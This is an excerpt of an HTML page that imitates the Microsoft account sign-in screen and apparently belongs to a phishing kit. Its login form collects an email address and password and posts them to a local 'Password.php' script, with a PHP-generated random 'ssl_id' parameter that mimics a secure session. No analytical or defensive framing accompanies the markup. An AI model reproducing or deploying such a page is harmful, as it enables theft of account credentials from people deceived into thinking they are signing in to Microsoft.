...
<html dir="ltr" class="" lang="en">
   ...
   <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
      <div>
         ...
         <form name="f1" id="i0281" method="post" action="Password.php?ssl_id=<?php echo generateRandomString(130); ?>">
                                    ...
                                    <div class="form-group col-md-24">
                                       ...
                                       <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                                          ...
                                          updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                            <input type="email" name="username" required id="i0116" maxlength="113" class="form-control ltr_override" aria-required="true" data-bind="
                                             ...
                                             placeholder: $placeholderText" aria-label="Enter your email address, phone number or Skype." aria-describedby="loginHeader" placeholder="Email address, phone number or Skype" lang="en"> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> 
                                       </div>
                                       ...
                                       <div class="col-md-24">
                                          <div class="text-13 action-links">
                                             ...
                                             <div class="form-group" data-bind="
                                                ...
                                                click: signup_onClick } }">No account? <a href="#" id="signup" aria-label="Create a Microsoft account" name="createAccount">Create one!</a></div>
